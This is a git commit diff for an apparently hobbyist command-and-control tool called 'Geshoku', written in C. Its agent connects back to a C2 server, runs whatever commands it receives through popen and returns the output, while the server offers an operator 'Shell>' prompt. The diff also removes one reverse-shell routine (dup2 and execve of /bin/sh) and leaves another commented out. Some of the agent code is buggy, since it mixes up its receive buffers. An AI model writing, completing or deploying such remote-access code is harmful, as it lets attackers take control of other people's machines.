a6f930121fd99b3ae04df0d99a4f6384de8dd3d0
yukiryqqe <mokimr23@protonmail.com>
2024-09-08 21:46:15 +0100

    stuff

--- src/agent/agent.c
+++ src/agent/agent.c
@@ -5,13 +5,32 @@
 #include <getopt.h>
 #include <netinet/in.h>
 #include <unistd.h>
+#include <string.h>
 
 #define SERVER_IP "127.0.0.1"
-#define SERVER_PORT 4444
+#define SERVER_PORT 6666
+
+void execute_command(int socket, char *command) {
+  char buffer[1024];
+  FILE *fp;
+  fp=popen(command,"r");
+  if(fp==NULL) {
+    strcpy(buffer,"[Err] Failed to execute order\n");
+    send(socket,buffer,strlen(buffer),0);
+    return;
+  }
+
+  while(fgets(buffer,sizeof(buffer),fp)!=NULL) {
+    send(socket,buffer,strlen(buffer),0);
+  }
+
+  pclose(fp);
+}
 
 int main(int argc, char *argv[]) {
+  char buffer[1024];
   int sockd;  
-  struct sockaddr_int server_addr;
+  struct sockaddr_in server_addr;
   int read_size;
   char data[1024];
 
@@ -20,14 +39,50 @@ int main(int argc, char *argv[]) {
     perror("[Err] Failed socket creation");
     exit(-1);
   }
-  server_addr.sin_family=AF_INET,
-  server_addr.sin_addr.s_addr=inet_addr(SERVER_IP),
-  server_addr.sin_port=htons(SERVER_PORT);
-  if(connect(sock,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
+  server_addr.sin_family=AF_INET;
+  server_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
+  server_addr.sin_port=htons(6666);
+  if(connect(sockd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
     perror("[Err] Connection failed");
+    close(sockd);
     exit(-1);
   }
   printf("[Info] Connected to C2 at %s:%d\n",SERVER_IP,SERVER_PORT);
+  while ((read_size = recv(sockd, data, sizeof(data) - 1, 0)) > 0) {
+        buffer[read_size] = '\0';  // Null-terminate the command
+        printf("[Info] Received command: %s\n", buffer);
 
-  while(read_size=read)
+        // Execute the received command using popen
+        FILE *fp;
+        fp = popen(buffer, "r");
+        if (fp == NULL) {
+            char error_msg[] = "[Err] Failed to execute command\n";
+            send(sockd, error_msg, strlen(error_msg), 0);
+            continue;
+        }
+
+        // Send the command output back to the C2 server
+        while (fgets(data, sizeof(data), fp) != NULL) {
+            send(sockd, buffer, strlen(buffer), 0);
+        }
+
+        pclose(fp);
+    }
+
+    // Handle disconnection
+    if (read_size == 0) {
+        printf("[Info] C2 server disconnected\n");
+    } else if (read_size < 0) {
+        perror("[Err] Failed to receive data from server");
+    }
+  /*dup2(sockd,0);
+  dup2(sockd,1);
+  dup2(sockd,2);
+
+  char *args[] = {"/bin/bash",NULL};
+  execve("/bin/bash",args,NULL);
+  */
+  close(sockd);
+
+  return 0;
 }
--- src/server/server.c
+++ src/server/server.c
@@ -5,7 +5,7 @@
 #include <getopt.h>
 #include <netinet/in.h>
 #include <unistd.h>
-
+#include <string.h>
 void welcome_message() {
     printf("-----------Geshoku------------\n");
     printf("------------------------------\n");
@@ -13,33 +13,74 @@ void welcome_message() {
     printf("------------------------------\n\n");
 }
 
-void spawn_shell(int client_socket) {
-  char *argv[]={"/bin/sh",NULL};
+void handle_client(int client_socket) {
+    char command[1024];
+    char buffer[2048];
+    int read_size;
 
-  dup2(client_socket,0);
-  dup2(client_socket,1);
-  dup2(client_socket,2);
+    printf("[Info] Agent connected. You can now send commands.\n");
 
-  execve("/bin/sh",argv,NULL);
-  perror("[Err] Shell execution failed");
-  exit(-1);
+    while (1) {
+        // Prompt the user to enter a command
+        printf("Shell> ");
+        fgets(command, sizeof(command), stdin);
+
+        // Remove the newline character from the end of the command
+        command[strcspn(command, "\n")] = '\0';
+
+        // Exit the loop if the user enters "exit"
+        if (strcmp(command, "exit") == 0) {
+            break;
+        }
+
+        // Send the command to the agent
+        if (send(client_socket, command, strlen(command), 0) < 0) {
+            perror("[Err] Failed to send command");
+            break;
+        }
+
+        // Receive the output from the agent
+        printf("[Info] Command output:\n");
+        while ((read_size = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
+            buffer[read_size] = '\0';  // Null-terminate the response
+            printf("%s", buffer);
+
+            // Break if the output is shorter than the buffer size (indicating end of output)
+            if (read_size < sizeof(buffer) - 1) {
+                break;
+            }
+        }
+
+        // If recv() returns 0, the agent has disconnected
+        if (read_size == 0) {
+            printf("[Info] Agent disconnected\n");
+            break;
+        } else if (read_size < 0) {
+            perror("[Err] Failed to receive data from agent");
+            break;
+        }
+    }
+
+    // Close the client socket
+    close(client_socket);
 }
 
 void start_server() {
   printf("[Info] Starting HTTP server...\n");
   int sockd=socket(AF_INET,SOCK_STREAM,0);
+  int client_socket;
   if(sockd<0){
     perror("[Err] Failed socket creation");
     exit(-1);
   }
   struct sockaddr_in server_addr, client_addr;
   socklen_t client_len=sizeof(client_addr);
-  server_addr.sin_family=AF_INET,
-  server_addr.sin_addr.s_addr=INADDR_ANY,
+  server_addr.sin_family=AF_INET;
+  server_addr.sin_addr.s_addr=INADDR_ANY;
   server_addr.sin_port=htons(6666);
 
   bind(sockd,(struct sockaddr *) &server_addr, sizeof(server_addr));
-  
+  printf("[Debug] Binded socket\n"); 
   if(listen(sockd,5)<0){
     perror("[Err] Listening failed");
     close(sockd);
@@ -47,16 +88,17 @@ void start_server() {
   }
 
   printf("[Info] Geshoku listening on port 6666\n");
-
-  int clientd=accept(sockd,(struct sockaddr *)&client_addr,&client_len);
+  while((client_socket=accept(sockd,(struct sockaddr *)&client_addr,&client_len))>=0) {
+    printf("[Info] Received callback from %s:%d\n",inet_ntoa(client_addr.sin_addr),ntohs(client_addr.sin_port));
+    handle_client(client_socket);
+  }
+  
   printf("[Info] Received callback\n");
-  spawn_shell(clientd);
-  close(clientd);
+  //spawn_shell(clientd);
+  close(client_socket);
   close(sockd);
 
 }
-
-
 
 int main(int argc, char *argv[]) {
     if(argc<2){
